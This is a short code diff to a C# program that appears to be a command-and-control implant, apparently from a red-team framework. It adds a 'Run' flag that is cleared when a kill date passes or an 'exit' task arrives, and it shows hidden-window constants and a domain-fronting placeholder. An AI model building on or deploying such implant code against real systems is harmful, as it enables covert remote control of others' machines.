@@ -23,8 +23,8 @@ public class Program
 	public const int SW_HIDE = 0;
 	public const int SW_SHOW = 5;
     public static string taskId;
-    private static string pKey;
-
+    public static bool Run = true;
+    private static string pKey;    
     private static int dfs = 0;
 	private static string[] dfarray = {#REPLACEDF#};
 	public static string[] dfhead = null;
@@ -479,6 +479,7 @@ public class Program
 		{
 			if (DateTime.ParseExact(KillDate, "dd/MM/yyyy", CultureInfo.InvariantCulture) < DateTime.Now)
 			{
+				Run = false;
 				exitvt.Set();
 				continue;
 			}
@@ -505,6 +506,7 @@ public class Program
 						cmd = c.Substring(5, c.Length - 5);
 						if (cmd.ToLower().StartsWith("exit"))
 						{
+							Run = false;
 							exitvt.Set();
 							break;
 						}						
